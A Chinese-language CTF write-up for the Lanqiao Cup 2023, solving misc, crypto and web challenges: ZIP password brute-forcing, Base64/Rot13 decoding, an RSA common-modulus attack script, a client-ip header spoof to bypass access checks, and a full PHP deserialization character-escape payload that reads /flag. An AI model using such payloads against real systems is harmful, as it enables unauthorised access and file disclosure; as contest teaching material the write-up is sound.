# 蓝桥杯 2023

## Misc

### ZIP

通过在 WireShark 中检索 HTTP 请求，可以发现一个压缩包上传请求，通过追踪 TCP 流可以发现找到以下内容

```
PK....	...0..Vx...8...*.......flag.txt......nE...f.o.. ..]..Cp..]..a....b...7?..7.....^.Y...s.PK..x...8...*...PK......	...0..Vx...8...*.....$....... .......flag.txt
. ............Ze......Ze......Ke...PK..........Z...n.................
ChunQiu\d{4}
```

通过 010Editor 新建成一个 zip 压缩包文件，通过备注可以发现 Hint `密码的正则：ChunQiu\d{4}`

因此通过 python 创建一个字典

```python
for i in range(0000, 10000):
    print("ChunQiu{:04}".format(i))
```

创建字典后复制粘贴到 txt 中，使用 `ARCHPR` 进行字典密码爆破即可获得 flag

### CyberChef

打开网页可以发现 flag 被 Base64 和 Rot13 两次加密后得到密文 `CpakC3wnB2L3Q2IlBb02QGT1OWT4QGDwBpMmBV01PmXbCmBzQcP1CWg9` ，通过本地打开 CyberChef 将密文输入至 Input 内，选择 Rot13 Brute Force，取消勾选 Print amount，可以得到很多 Base64 编码的字符串

```
DqblD3xoC2M3R2JmCc02RHU1PXU4RHExCqNnCW01QnYcDnCaRdQ1DXh9
ErcmE3ypD2N3S2KnDd02SIV1QYV4SIFyDrOoDX01RoZdEoDbSeR1EYi9
FsdnF3zqE2O3T2LoEe02TJW1RZW4TJGzEsPpEY01SpAeFpEcTfS1FZj9
GteoG3arF2P3U2MpFf02UKX1SAX4UKHaFtQqFZ01TqBfGqFdUgT1GAk9
HufpH3bsG2Q3V2NqGg02VLY1TBY4VLIbGuRrGA01UrCgHrGeVhU1HBl9
IvgqI3ctH2R3W2OrHh02WMZ1UCZ4WMJcHvSsHB01VsDhIsHfWiV1ICm9
JwhrJ3duI2S3X2PsIi02XNA1VDA4XNKdIwTtIC01WtEiJtIgXjW1JDn9
KxisK3evJ2T3Y2QtJj02YOB1WEB4YOLeJxUuJD01XuFjKuJhYkX1KEo9
LyjtL3fwK2U3Z2RuKk02ZPC1XFC4ZPMfKyVvKE01YvGkLvKiZlY1LFp9
MzkuM3gxL2V3A2SvLl02AQD1YGD4AQNgLzWwLF01ZwHlMwLjAmZ1MGq9
NalvN3hyM2W3B2TwMm02BRE1ZHE4BROhMaXxMG01AxImNxMkBnA1NHr9
ObmwO3izN2X3C2UxNn02CSF1AIF4CSPiNbYyNH01ByJnOyNlCoB1OIs9
PcnxP3jaO2Y3D2VyOo02DTG1BJG4DTQjOcZzOI01CzKoPzOmDpC1PJt9
QdoyQ3kbP2Z3E2WzPp02EUH1CKH4EURkPdAaPJ01DaLpQaPnEqD1QKu9
RepzR3lcQ2A3F2XaQq02FVI1DLI4FVSlQeBbQK01EbMqRbQoFrE1RLv9
SfqaS3mdR2B3G2YbRr02GWJ1EMJ4GWTmRfCcRL01FcNrScRpGsF1SMw9
TgrbT3neS2C3H2ZcSs02HXK1FNK4HXUnSgDdSM01GdOsTdSqHtG1TNx9
UhscU3ofT2D3I2AdTt02IYL1GOL4IYVoThEeTN01HePtUeTrIuH1UOy9
VitdV3pgU2E3J2BeUu02JZM1HPM4JZWpUiFfUO01IfQuVfUsJvI1VPz9
WjueW3qhV2F3K2CfVv02KAN1IQN4KAXqVjGgVP01JgRvWgVtKwJ1WQa9
XkvfX3riW2G3L2DgWw02LBO1JRO4LBYrWkHhWQ01KhSwXhWuLxK1XRb9
YlwgY3sjX2H3M2EhXx02MCP1KSP4MCZsXlIiXR01LiTxYiXvMyL1YSc9
ZmxhZ3tkY2I3N2FiYy02NDQ1LTQ4NDAtYmJjYS01MjUyZjYwNzM1ZTd9
AnyiA3ulZ2J3O2GjZz02OER1MUR4OEBuZnKkZT01NkVzAkZxOaN1AUe9
BozjB3vmA2K3P2HkAa02PFS1NVS4PFCvAoLlAU01OlWaBlAyPbO1BVf9
```

通过 Base64 解码即可获得到 flag{dcb77abc-6445-4840-bbca-5252f60735e7}

## Crypto

### RSA

通过 python 代码可以获取到 e1 的值为 `965035544`

```python
import random
random.seed(123456)
e1 = random.randint(100000000, 999999999)
print(e1)
```

通过分析代码可以发现两次加密使用同一个 m、n，并且 e1 和 e2 互素，因此可以进行共模攻击获取 flag

```python
import gmpy2
import libnum

n= 7265521127830448713067411832186939510560957540642195787738901620268897564963900603849624938868472135068795683478994264434459545615489055678687748127470957
e1= 965035544
c1= 3315026215410356401822612597933850774333471554653501609476726308255829187036771889305156951657972976515685121382853979526632479380900600042319433533497363
e2= 65537
c2= 1188105647021006315444157379624581671965264301631019818847700108837497109352704297426176854648450245702004723738154094931880004264638539450721642553435120

def rsa_gong_N_def(e1,e2,c1,c2,n):
    e1, e2, c1, c2, n=int(e1),int(e2),int(c1),int(c2),int(n)
    s = gmpy2.gcdext(e1, e2)
    s1 = s[1]
    s2 = s[2]
    if s1 < 0:
        s1 = - s1
        c1 = gmpy2.invert(c1, n)
    elif s2 < 0:
        s2 = - s2
        c2 = gmpy2.invert(c2, n)
    m = (pow(c1,s1,n) * pow(c2 ,s2 ,n)) % n
    return int(m)

m = rsa_gong_N_def(e1,e2,c1,c2,n)
print(m)
print(libnum.n2s(int(m)))
```

## Web

### 禁止访问

通过 BurpSuite 的 Repeater 添加 Header 头 `client-ip: 192.168.1.1` 后即可获取 flag

### ezphp

#### **考点**

1. 序列化使用 `S` 来识别十六进制字符
2. 通过数组来动态调用类内函数
3. 序列化字符逃逸

#### **源代码**

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class A{
  public $key;
  public function readflag(){
    if($this->key === "\0key\0"){
      readfile('/flag');
    }
  }
}
class B{
  public function  __toString(){
    return ($this->b)();
  }
}
class C{
  public $s;
  public $str;
  public function  __construct($s){
    $this->s = $s;
  }
  public function  __destruct(){
    echo $this->str;
  }
}

$ser = serialize(new C($_GET['c']));
$data = str_ireplace("\0","00",$ser);
unserialize($data);
```

#### **序列化构造**

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class A{
  public $key;
  
  // New
  public function __construct() {
    $this->key = "\0key\0";
  }
  
  public function readflag(){
    if($this->key === "\0key\0"){
      readfile('/flag');
    }
  }
}
class B{
  public $b; // New
  
  // New
  public function __construct() {
    $this->b = [new A(), "readflag"];
  }
  
  public function  __toString(){
    ($this->b)(); // New
    return ""; // New
  }
}
class C{
  public $s;
  public $str;
  public function  __construct(){
    $this->s = '';
    $this->str = new B(); // New
  }
  public function  __destruct(){
    echo $this->str;
  }
}

$ser = serialize(new C($_GET['c']));
echo $ser; // O:1:"C":2:{s:1:"s";s:0:"";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";s:5:"key";}i:1;s:8:"readflag";}}}
```

#### **字符逃逸**

题目中只能通过 `c` 进行传值，因此需要通过题目提供的 `str_ireplace()` 函数进行字符逃逸给 `str` 赋值以下内容

```
";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";s:5:"key";}i:1;s:8:"readflag";}}}
```

可以发现 `s:5:"key";` 匹配不上，结果需要是 `\0key\0` ，又因为现在序列化用的是双引号，PHP 使用单引号时 `\0` 无法被转义，因此需要使用 `str_ireplace('00', "\0", $str)` 进行替换，并且在序列化中 s 不能识别十六进制字符，因此需要将 `s` 改为 `S` 。

在题目有还有一个 `str_ireplace("\0","00",$ser);` 会将`\0` 变成 `00` ，因此需要给 key 的值加上反斜杠 `\`

```php
str_ireplace('00', "\0", '";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\00key\00";}i:1;s:8:"readflag";}}}');
// O:1:"C":2:{s:1:"s";s:197:"1";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\key\";}i:1;s:8:"readflag";}}}";s:3:"str";N;}
```

因此逃逸的字符有 96 个，即

```
";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\key\";}i:1;s:8:"readflag";}}}
```

接下来就是进行字符逃逸，先通过 `str_repeat("\0", 96)` 进行尝试得到的结果如下：（192 个 0）

```
O:1:"C":2:{s:1:"s";s:194:"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\00key\00";}i:1;s:8:"readflag";}}}";s:3:"str";N;}
```

不足以逃逸就继续向上增，增到 98 时发现正好足够：（196 个 0）

```
O:1:"C":2:{s:1:"s";s:196:"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\00key\00";}i:1;s:8:"readflag";}}}";s:3:"str";N;}
```

这时候就已经逃逸成功了！flag 也就出来力！

通过 `urlencode()` 就可以得到 payload力

```
%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A3%3A%22key%22%3BS%3A5%3A%22%5C%00key%5C%00%22%3B%7Di%3A1%3Bs%3A8%3A%22readflag%22%3B%7D%7D%7D
```

#### **序列化 s 与 S 的补充**

https://github.com/php/php-src/blob/e8fb0edc69598e7d9380f61a1ab551b5ec6c27ca/ext/standard/var\_unserializer.re#L1025C20-L1094

```cpp
"s:" uiv ":" ["] 	{
	size_t len, maxlen;
	char *str;

	len = parse_uiv(start + 2);
	maxlen = max - YYCURSOR;
	if (maxlen < len) {
		*p = start + 2;
		return 0;
	}

	str = (char*)YYCURSOR;

	YYCURSOR += len;

	if (*(YYCURSOR) != '"') {
		*p = YYCURSOR;
		return 0;
	}

	if (*(YYCURSOR + 1) != ';') {
		*p = YYCURSOR + 1;
		return 0;
	}

	YYCURSOR += 2;
	*p = YYCURSOR;

	if (!var_hash) {
		/* Array or object key unserialization */
		ZVAL_STR(rval, zend_string_init_existing_interned(str, len, 0));
	} else {
		ZVAL_STRINGL_FAST(rval, str, len);
	}
	return 1;
}

"S:" uiv ":" ["] 	{
	size_t len, maxlen;
	zend_string *str;

	len = parse_uiv(start + 2);
	maxlen = max - YYCURSOR;
	if (maxlen < len) {
		*p = start + 2;
		return 0;
	}

	if ((str = unserialize_str(&YYCURSOR, len, maxlen)) == NULL) {
		return 0;
	}

	if (*(YYCURSOR) != '"') {
		zend_string_efree(str);
		*p = YYCURSOR;
		return 0;
	}

	if (*(YYCURSOR + 1) != ';') {
		efree(str);
		*p = YYCURSOR + 1;
		return 0;
	}

	YYCURSOR += 2;
	*p = YYCURSOR;

	ZVAL_STR(rval, str);
	return 1;
}
```

其中 S 比 s 多调用了函数 `unserialize_str()` ，进行了 16 进制的解析

https://github.com/php/php-src/blob/e8fb0edc69598e7d9380f61a1ab551b5ec6c27ca/ext/standard/var\_unserializer.re#L323

```cpp
static zend_string *unserialize_str(const unsigned char **p, size_t len, size_t maxlen)
{
	size_t i, j;
	zend_string *str = zend_string_safe_alloc(1, len, 0, 0);
	unsigned char *end = *(unsigned char **)p+maxlen;

	if (end < *p) {
		zend_string_efree(str);
		return NULL;
	}

	for (i = 0; i < len; i++) {
		if (*p >= end) {
			zend_string_efree(str);
			return NULL;
		}
		if (**p != '\\') {
			ZSTR_VAL(str)[i] = (char)**p;
		} else {
			unsigned char ch = 0;

			for (j = 0; j < 2; j++) {
				(*p)++;
				if (**p >= '0' && **p <= '9') {
					ch = (ch << 4) + (**p -'0');
				} else if (**p >= 'a' && **p <= 'f') {
					ch = (ch << 4) + (**p -'a'+10);
				} else if (**p >= 'A' && **p <= 'F') {
					ch = (ch << 4) + (**p -'A'+10);
				} else {
					zend_string_efree(str);
					return NULL;
				}
			}
			ZSTR_VAL(str)[i] = (char)ch;
		}
		(*p)++;
	}
	ZSTR_VAL(str)[i] = 0;
	ZSTR_LEN(str) = i;
	return str;
}
```
